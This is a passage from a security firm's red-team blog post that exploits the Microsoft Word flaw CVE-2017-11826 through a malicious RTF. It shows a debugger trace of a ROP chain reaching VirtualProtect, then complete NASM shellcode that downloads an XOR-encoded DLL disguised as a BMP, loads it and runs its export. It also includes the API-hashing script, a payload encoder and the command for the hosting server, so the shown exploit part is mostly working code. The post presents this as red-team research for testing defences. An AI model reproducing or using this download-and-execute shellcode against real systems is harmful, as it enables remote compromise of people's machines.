msvbvm60!IID_IVbaHost+0xef2a:
7297d56a c20800          ret     8

0:000>
eax=00644bf8 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=729440cb esp=0f8f4874 ebp=00644c48 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
msvbvm60!ThunRTMain+0xb27:
729440cb 58              pop     eax

0:000>
eax=729410d0 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=729440cc esp=0f8f4878 ebp=00644c48 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
msvbvm60!ThunRTMain+0xb28:
729440cc c3              ret

0:000>
eax=729410d0 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7295088f esp=0f8f487c ebp=00644c48 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
msvbvm60!Zombie_Release+0x1e36:
7295088f ff20            jmp     dword ptr [eax]      ds:002b:729410d0={kernel32!VirtualProtectStub (75e342ff)}

0:000> dd esp
0f8f487c  0f8f4890 0f8f4890 00000200 00000040
0f8f488c  72a4d300 729440cc 088883ec 729440cb
0f8f489c  088883ec 729440cb 088883ec 729440cb
0f8f48ac  088883ec 729440cb 088883ec 729440cb
0f8f48bc  088883ec 729440cb 088883ec 729440cb
0f8f48cc  088883ec 729440cb 088883ec 729440cb
0f8f48dc  088883ec 729440cb 088883ec 729440cb
0f8f48ec  088883ec 729440cb 088883ec 729440cb

0:000> u 0f8f4890
0f8f4890 cc              int     3
0f8f4891 40              inc     eax
0f8f4892 94              xchg    eax,esp
0f8f4893 72ec            jb      0f8f4881
0f8f4895 838808cb409472  or      dword ptr [eax-6BBF34F8h],72h
0f8f489c ec              in      al,dx
0f8f489d 838808cb409472  or      dword ptr [eax-6BBF34F8h],72h
0f8f48a4 ec              in      al,dx

0:000> g
(ecc.3d4): Break instruction exception - code 80000003 (first chance)
eax=00000001 ebx=00000000 ecx=f1290000 edx=003fe188 esi=0a45f4d0 edi=0a47cde4
eip=0f8f4890 esp=0f8f4890 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
0f8f4890 cc              int     3
```

The only task left is writing a shellcode. ASM is beautiful, but it is generally more pleasurable to write C. Our shellcode will perform the following actions:

* Download a DLL from somewhere in the internet
* LoadLibrary() the downloaded file

However, downloading a DLL is not the paradigm of stealth. We are going to implement a very naif disguise: we will prepend the 58 bytes of a BMP file to the downloaded file. The rest of the contents will be xor‚Äôed with a fixed value. In pseudoCode:

```
char url[] = "https://127.0.0.1:8000/asd.bmp";
char download_path[256] = { 0 };
HANDLE hnd, lib;
DWORD filesize, nbytes;
DWORD tmp;
char *dll, *bmp;
int (*pwn)(void);

URLDownloadToCacheFileA(NULL, url, download_path, 255, 0, NULL);

hnd = CreateFileA(
          download_path,
          GENERIC_READ | GENERIC_WRITE,
          FILE_SHARED_READ,
          0,
          OPEN_EXISTING,
          FILE_ATTRIBUTE_NORMAL,
          NULL
      );

filesize = GetFileSize(hnd, NULL);

bmp = VirtualAlloc(NULL, filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

ReadFile(hnd, bmp, filesize, &nbytes, NULL);

dll = bmp + 58;
for(unsigned int i = 0; i < filesize; i += 4) {
  tmp = * ((DWORD *) &dll[i]);
  tmp ^= 0x1337c0de
}

SetFilePointer(hnd, 0, 0, FILE_BEGIN);
WriteFile(hnd, dll, filesize - 58, &nbytes, NULL);
SetEndOfFile(hnd);
CloseHandle(hnd);

lib = LoadLibraryA(download_path);
pwn = GetProcAddress(lib, "doit");
pwn();
```

We will use NASM to write the shellcode. First of all, we need a simple way to call into the WinApi. This problem was solved time ago and there are known public implementations. We are going to use [Metasploit‚Äôs one](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm).

Our shellcode starts by defining all the constants we will need. Write in pwn.asm:

```
BITS 32
ORG 0

MEM_COMMIT: equ 0x00001000
MEM_RESERVE: equ 0x00002000

PAGE_EXECUTE: equ 0x10
PAGE_EXECUTE_READ: equ 0x20
PAGE_EXECUTE_READWRITE: equ 0x40
PAGE_READWRITE: equ 0x04

GENERIC_READ: equ 0x80000000
GENERIC_WRITE: equ 0x40000000
FILE_SHARE_READ: equ 0x01
OPEN_EXISTING: equ 0x03
FILE_ATTRIBUTE_NORMAL: equ 0x80
FILE_BEGIN: equ 0x00
```

Metasploit‚Äôs shellcode is easy to use. When we call a function from the WinApi we usually do the following:

```
push arg_N
push arg_N-1
...
push arg_1
push arg_0
call winapi
```

When using MSF‚Äôs shellcode, an additional argument is pushed: a simple hash of the library and function‚Äôs name. The shellcode will traverse the list of modules loaded in the process, and then each module‚Äôs exports. At each interation it will compare the calculated hash with the one pushed by us, until there is a match. So:

```
push arg_N
push arg_N-1
...
push arg_1
push arg_0
push HASH
call msf_api
```

Lets define all the hashes we will use. The code we used is based on the one [here](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py).

```
import sys

def ror( dword, bits ):
  return ( dword >> bits | dword << ( 32 - bits ) ) & 0xFFFFFFFF
#=============================================================================#
def unicode( string, uppercase=True ):
  result = "";
  if uppercase:
    string = string.upper()
  for c in string:
    result += c + "x00"
  return result
#=============================================================================#
def hash( module, function, bits=13, print_hash=True ):
  module_hash = 0
  function_hash = 0
  for c in unicode( module + "x00" ):
    module_hash  = ror( module_hash, bits )
    module_hash += ord( c )
  for c in str( function + "x00" ):
    function_hash  = ror( function_hash, bits )
    function_hash += ord( c )
  h = module_hash + function_hash & 0xFFFFFFFF
  if print_hash:
    print "[+] 0x%08X = %s!%s" % ( h, module.lower(), function )
  return h

if __name__ == '__main__':
        for x in sys.argv[1:]:
                module, function = x.split(":", 2)
                print module, function, hex(hash(module, function, print_hash=False))
```

We add the definitions to pwn.asm:

```
VIRTUALALLOC_HASH: equ 0xe553a458
VIRTUALPROTECT_HASH: equ 0xc38ae11
URLDOWNLOADTOCACHEFILE_HASH equ 0xdac0c98f
GETFILESIZE_HASH: equ 0x701e12c6
CREATEFILE_HASH: equ 0x4fdaf6da
READFILE_HASH: equ 0xbb5f9ead
WRITEFILE_HASH: equ 0x5bae572d
SETFILEPOINTER_HASH: equ 0xd812cdaa
SETENDOFFILE_HASH: equ 0xd7e3cbdb
CLOSEHANDLE_HASH: equ 0x528796c6
LOADLIBRARY_HASH: equ 0x726774c
GETPROCADDRESS_HASH: equ 0x7802f749
DELETEFILE_HASH: equ 0x13dd2ed7
EXITPROCESS_HASH: equ 0x56a2b5f0
```

And define a structure in which we will store our variables:

```
STRUC mydata
    .api_call:      resd 1      ; address of MSF's api
    .filehandle:    resd 1      ; HANDLE given by CreateFileA
    .filebuf:       resd 1      ; address returned by VirtualAlloc
    .filesize:      resd 1      ; size returned by GetFileSize
    .nbytes:        resd 1      ; used by ReadFile and WriteFile
    .url:           resb 256    ; URL we will download the BMP from
    .down_filename: resb 256    ; URLDownloadToCacheFileA will write here the path where it saved the file
    .apiname:       resb 64     ; the string "doit" passed to GetProcAddress
ENDSTRUC
```

And then we write the code:

```
cld
call start

%include "block_api.asm" ;

start:
    pop ebp     ; ebp -> api MSF

    ; we alloc some space for mydata
    push dword PAGE_READWRITE
    push dword (MEM_COMMIT | MEM_RESERVE)
    push mydata_size
    push 0
    push VIRTUALALLOC_HASH
    call ebp

    ; save MSF's api address and use ebp as a pointer to mydata
    mov dword [eax + mydata.api_call], ebp
    mov ebp, eax

    ; url = "https://127.0.0.1:8000/asd.bmp"
    mov dword [ebp + mydata.url], 0x70747468
    mov dword [ebp + mydata.url + 4], 0x312f2f3a
    mov dword [ebp + mydata.url + 8], 0x302e3732
    mov dword [ebp + mydata.url + 12], 0x312e302e
    mov dword [ebp + mydata.url + 16], 0x3030383a
    mov dword [ebp + mydata.url + 20], 0x73612f30
    mov dword [ebp + mydata.url + 24], 0x6d622e64
    mov dword [ebp + mydata.url + 28], 0x00000070

    ; apiname = "doit"
    mov dword [ebp + mydata.apiname], 0x74696f64
    mov dword [ebp + mydata.apiname + 4], 0x00000000

    ; UrlDownloadToCacheFileA(mydata.url, mydata.url_filename, 254, 0, NULL);
    push 0                              ; pBSC
    push 0                              ; dwReserved
    push 254                            ; cchFileName
    lea eax, [ebp + mydata.down_filename]
    push eax                            ; szFileName
    lea eax, [ebp + mydata.url]
    push eax                            ; szUrl
    push 0                              ; lpUnkCaller
    push URLDOWNLOADTOCACHEFILE_HASH
    call dword [ebp + mydata.api_call]

    ; mydata.filehandle = CreateFileA(
    ;                       mydata.url_filename,
    ;                       GENERIC_READ | GENERIC_WRITE,
    ;                       FILE_SHARED_READ,
    ;                       0,
    ;                       OPEN_EXISTING,
    ;                       FILE_ATTRIBUTE_NORMAL,
    ;                       NULL
    ; )
    push dword 0                        ; hTemplateFile
    push dword FILE_ATTRIBUTE_NORMAL    ; dwFlagsAndAttributes
    push dword OPEN_EXISTING            ; dwCreationDisposition
    push dword 0                        ; lpSecurityAttributes
    push dword FILE_SHARE_READ          ; dwShareMode
    push dword (GENERIC_READ | GENERIC_WRITE) ; dwDesiredAccess
    lea eax, [ebp + mydata.down_filename]
    push eax
    push CREATEFILE_HASH
    call dword [ebp + mydata.api_call]
    mov dword [ebp + mydata.filehandle], eax

    ; mydata.filesize = GetFileSize(mydata.filehandle, NULL)
    push dword 0                        ; lpFileSizeHigh
    push eax                            ; hFile
    push GETFILESIZE_HASH
    call dword [ebp + mydata.api_call]
    mov dword [ebp + mydata.filesize], eax

    ; mydata.filebuf = VirtualAlloc(
    ;                     NULL,
    ;                     mydata.filesize,
    ;                     MEM_COMMIT | MEM_RESERVE,
    ;                     PAGE_READWRITE
    ;                 );
    push dword PAGE_READWRITE
    push dword (MEM_COMMIT | MEM_RESERVE)
    push eax
    push 0
    push VIRTUALALLOC_HASH
    call dword [ebp + mydata.api_call]
    mov dword [ebp + mydata.filebuf], eax

    ; ReadFile(
    ;         mydata.filehandle,
    ;         mydata.filebuf,
    ;         mydata.filesize,
    ;         &mydata.nbytes,
    ;         NULL
    ; )
    push dword 0                        ; lpOverlapped
    lea ecx, [ebp + mydata.nbytes]
    push ecx                            ; lpNumberOfBytesRead
    mov ecx, dword [ebp + mydata.filesize]
    push ecx                            ; nNumberOfBytesToRead
    push eax                            ; lpBuffer
    mov eax, dword [ebp + mydata.filehandle]
    push eax                            ; hFile
    push READFILE_HASH
    call dword [ebp + mydata.api_call]

    ; dll = bmp + 58;
    ; for(unsigned int i = 0; i < filesize; i += 4) {
    ;   tmp = * ((DWORD *) &dll[i]);
    ;   tmp ^= 0x1337c0de
    ; }
    mov edi, dword [ebp + mydata.filebuf]
    add edi, 58
    mov ecx, dword [ebp + mydata.filesize]
    sub ecx, 58
    sar ecx, 2
decode_loop:
    xor dword [edi], 0x1337c0de
    add edi, 4
    dec ecx
    jnz decode_loop

    ; SetFilePointer(mydata.filehandle, 0, 0, FILE_BEGIN)
    push dword FILE_BEGIN               ; dwMoveMethod
    push dword 0                        ; lpDistanceToMoveHigh
    push dword 0                        ; lDistanceToMove
    mov eax, dword [ebp + mydata.filehandle]
    push eax
    push SETFILEPOINTER_HASH
    call dword [ebp + mydata.api_call]

    ; WriteFile(
    ;     mydata.filehandle,
    ;     mydata.filebuf + 58,
    ;     mydata.filesize - 58,
    ;     &mydata.nbytes,
    ;     NULL
    ; )
    push dword 0                        ; lpOverlapped
    lea eax, [ebp + mydata.nbytes]
    push eax                            ; lpNumberOfBytesWritten
    mov eax, dword [ebp + mydata.filesize]
    sub eax, 58
    push eax                            ; nNumberOfBytesToWrite
    mov eax, dword [ebp + mydata.filebuf]
    add eax, 58
    push eax                            ; lpBuffer
    mov eax, dword [ebp + mydata.filehandle]
    push eax                            ; hFile
    push WRITEFILE_HASH
    call dword [ebp + mydata.api_call]

    ; SetEndOfFile(mydata.filehandle)
    mov eax, dword [ebp + mydata.filehandle]
    push eax
    push SETENDOFFILE_HASH
    call dword [ebp + mydata.api_call]

    ; CloseHandle(mydata.filehandle)
    mov eax, dword [ebp + mydata.filehandle]
    push eax
    push CLOSEHANDLE_HASH
    call dword [ebp + mydata.api_call]

    ; eax = LoadLibraryA(mydata.down_filename)
    lea eax, [ebp + mydata.down_filename]
    push eax
    push LOADLIBRARY_HASH
    call dword [ebp + mydata.api_call]

    ; eax = GetProcAddress(eax, mydata.apiname)
    lea ebx, [ebp + mydata.apiname]
    push ebx
    push eax
    push GETPROCADDRESS_HASH
    call dword [ebp + mydata.api_call]

    ; eax()
    call eax

    ; ExitProcess()
    push 0
    push EXITPROCESS_HASH
    call dword [ebp + mydata.api_call]
```

We finish the shellcode with a call to ExitProcess(). We assembly it:

```
$ nasm -o pwn.bin pwn.asm
$ ls -la pwn.bin
-rw-r--r-- 1 i i 519 Nov  8 11:36 pwn.bin
```

And then slightly modify our code to load the shellcode:

```
shellcode = open("pwn.bin", "rb").read()
```

Write a simple DLL to just display a message box:

```
#include

int __declspec(dllexport) doit()
{
  HANDLE current_process;
  char modulepath[MAX_PATH] = { 0 };
  char *txt = NULL;

  current_process = GetModuleHandleA(NULL);
  if (NULL != current_process) {
    if (0 != GetModuleFileNameA((HMODULE)current_process, modulepath, MAX_PATH)) {
      txt = modulepath;
    }
  }

  if (NULL == txt) {
    txt = "";
  }

  MessageBoxA(NULL, txt, "Hi from", MB_OK);

  return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
           )
{
  switch (ul_reason_for_call)
  {
  case DLL_PROCESS_ATTACH:
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}
```

And create the fake BMP:

```
import struct
import sys

k = struct.pack("<L", 0x1337c0de)
key = bytearray(k)

if __name__ == '__main__':
  f = open(sys.argv[1], "rb")
  b = bytearray(f.read())
  f.close()

  for i in range(len(b)):
    b[i] = b[i] ^ key[i % len(key)]

  f = open(sys.argv[2], "wb")
  b = ("a" * 58) + b        ; not a bmp huh?
  f.write(b)
  f.close()
```

Start an HTTP server in the folder where we have saved asd.bmp:

```
$ python -m SimpleHTTPServer 8000
```

And finally open the RTF with Word:

[![Pwned](data:image/gif;base64...)

![Pwned](https://www.tarlogic.com/wp-content/uploads/2017/12/pwned_well-300x234.png)](https://www.tarlogic.com/wp-content/uploads/2017/12/pwned_well.png) Pwned
## 0x06 ‚Äì Final words

This kind of exercises and research performed by the Red Team allow to check the robustness of the [hardening methods](https://www.tarlogic.com/operating-system-hardening/) and the effectiveness of the possible anti-APT and [EDR solutions](https://www.tarlogic.com/cybersecurity-glossary/edr/) deployed in out clien‚Äôts machines. Additionally, breaking into corporate networks through this kind of exploitation, simulating an APT, trains the defense team on this kind of security incidents.

Discover our work and¬†[cybersecurity services](https://www.tarlogic.com/cybersecurity-services/)¬†at¬†[www.tarlogic.com](https://www.tarlogic.com/)

Share this article

[Facebook](https://www.facebook.com/sharer.php?u=https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/) -
[Twitter](https://x.com/share?text=Exploiting Word: CVE-2017-11826&url=https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/) -
[Linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/&title=Exploiting Word: CVE-2017-11826&summary=Tarlogic Security's Red Team shows how to exploit the CVE-2017-11826 vulnerabilities that affected MS Office)

##### Related Posts

[![CVE-2023-42115: Vulnerabilities without security patch in Exim](data:image/gif;base64...)](https://www.tarlogic.com/blog/cve-2023-42115-exim-vulnerabilities/)
###### [CVE-2023-42115: Vulnerabilities without security patch in Exim](https://www.tarlogic.com/blog/cve-2023-42115-exim-vulnerabilities/)

30 - September - 2023
S.T.A¬≤.R.S Team

[Read more](https://www.tarlogic.com/blog/cve-2023-42115-exim-vulnerabilities/)

[![Bluetooth vulnerabilities in smart locks](data:image/gif;base64...)](https://www.tarlogic.com/blog/bluetooth-vulnerabilities-smart-locks/)
###### [Bluetooth vulnerabilities in smart locks](https://www.tarlogic.com/blog/bluetooth-vulnerabilities-smart-locks/)

29 - September - 2023
Fran √Ålvarez Wic

[Read more](https://www.tarlogic.com/blog/bluetooth-vulnerabilities-smart-locks/)

[![Hardware vulnerabilities in smart locks](data:image/gif;base64...)](https://www.tarlogic.com/blog/hardware-vulnerabilities-smart-locks/)
###### [Hardware vulnerabilities in smart locks](https://www.tarlogic.com/blog/hardware-vulnerabilities-smart-locks/)

21 - September - 2023
Fran √Ålvarez Wic

[Read more](https://www.tarlogic.com/blog/hardware-vulnerabilities-smart-locks/)

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:
Madrid
 Quintanavides 13-23,
 Business Park V√≠a Norte 2nd building,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)
 (+34) 912 919 319

 contact@tarlogic.com

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

¬© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now üí¨](#top)



=== Content from x.com_42826509_20250126_040718.html ===


